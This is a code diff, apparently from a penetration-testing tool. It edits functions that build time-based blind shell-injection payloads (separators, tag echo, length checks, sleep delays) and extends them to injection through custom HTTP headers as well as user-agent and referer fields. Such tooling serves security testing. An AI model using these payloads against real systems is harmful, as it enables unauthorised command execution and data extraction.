@@ -80,7 +80,7 @@ def decision(separator, TAG, output_length, delay, http_request_method):
                  "sleep 0 " + separator + 
                  "str=$(echo " + TAG + ") " + separator + 
                  # Find the length of the output.
-                 "str1=${#str} " + separator + 
+                 "str1=${#str}" + separator + 
                  "[ " + str(output_length) + " -eq ${str1} ] " + separator + 
                  "sleep " + str(delay) + " "
                  )
@@ -175,7 +175,9 @@ def decision_alter_shell(separator, TAG, output_length, delay, http_request_meth
       pass
 
     # New line fixation
-    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True:
+    if settings.USER_AGENT_INJECTION == True or \
+       settings.REFERER_INJECTION == True or \
+       settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
 
   return payload
@@ -331,7 +333,9 @@ def cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request
       pass
 
     # New line fixation
-    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True:
+    if settings.USER_AGENT_INJECTION == True or \
+       settings.REFERER_INJECTION == True or \
+       settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
 
   return payload
@@ -480,7 +484,9 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_r
       pass
 
     # New line fixation
-    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True:
+    if settings.USER_AGENT_INJECTION == True or \
+       settings.REFERER_INJECTION == True or \
+       settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
 
   return payload
@@ -631,7 +637,9 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_
       pass
 
     # New line fixation
-    if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True:
+    if settings.USER_AGENT_INJECTION == True or \
+       settings.REFERER_INJECTION == True or \
+       settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
 
   return payload
